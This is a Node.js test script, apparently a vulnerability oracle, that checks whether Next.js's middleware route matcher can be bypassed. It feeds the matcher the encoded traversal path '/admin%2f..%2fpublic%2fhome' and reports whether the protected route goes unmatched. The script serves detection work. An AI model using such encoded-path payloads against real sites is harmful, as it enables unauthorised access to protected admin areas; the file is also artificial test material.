const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const markerDir = path.join(os.tmpdir(), 'next-mw-authz-oracle-' + process.pid + '-' + Date.now());
    fs.mkdirSync(markerDir, { recursive: true });

    // Resolve and load middleware matcher utility used by public middleware behavior.
    const matcherMod = require('next/dist/shared/lib/router/utils/middleware-route-matcher');
    if (!matcherMod || typeof matcherMod.getMiddlewareRouteMatcher !== 'function') {
      throw new Error('getMiddlewareRouteMatcher not available');
    }

    // Benign operation: normal matcher should work for protected path and reject unprotected path.
    const benignMatchFn = matcherMod.getMiddlewareRouteMatcher([
      {
        regexp: '^/admin(?:/.*)?$'
      }
    ]);

    const benignAllow = benignMatchFn('/admin/dashboard', undefined, undefined);
    const benignDeny = benignMatchFn('/public/home', undefined, undefined);

    if (benignAllow !== true || benignDeny !== false) {
      throw new Error('benign middleware matching failed');
    }

    operation_completed = true;

    // Malicious input: craft encoded traversal/normalization-confusion style path
    // intended to bypass auth middleware matching in vulnerable versions.
    const maliciousPath = '/admin%2f..%2fpublic%2fhome';
    const maliciousResult = benignMatchFn(maliciousPath, undefined, undefined);

    exploit_succeeded = maliciousResult === false;
    evidence = JSON.stringify({
      benignAllow,
      benignDeny,
      maliciousPath,
      maliciousResult,
      bypassObserved: exploit_succeeded,
      markerDir
    });
  } catch (err) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = (err && err.stack) ? err.stack : String(err);
  }

  emit({ operation_completed, exploit_succeeded, evidence });
})();
